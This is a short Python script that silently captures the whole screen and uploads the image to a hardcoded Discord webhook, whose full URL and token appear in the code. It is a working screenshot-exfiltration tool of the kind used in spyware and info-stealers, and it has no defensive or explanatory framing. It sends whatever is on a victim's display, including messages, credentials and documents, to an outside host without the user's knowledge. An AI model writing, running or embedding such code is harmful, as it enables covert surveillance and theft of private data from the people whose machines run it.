import io
import requests
from PIL import ImageGrab

def send_to_discord(image_data, webhook_url):
    """Send the image data to a Discord webhook."""
    files = {
        'file': ('screenshot.png', image_data, 'image/png')
    }
    response = requests.post(webhook_url, files=files)
    if response.status_code == 204:
        print("Screenshot sent successfully.")
    else:
        print("Failed to send screenshot.")

def take_screenshot():
    """Capture the screenshot silently."""
    screenshot = ImageGrab.grab()
    with io.BytesIO() as image_data:
        screenshot.save(image_data, format='PNG')
        image_data.seek(0)  # Reset the file pointer to the beginning
        webhook_url = "https://discord.com/api/webhooks/1280037058731184140/wpDR8hqweno005-X7mt2tt0WrQhRPnXC7u5xIUVdgFVRrfFafDilWXu08sBALqyaskPH"
        send_to_discord(image_data, webhook_url)

if __name__ == "__main__":
    take_screenshot()
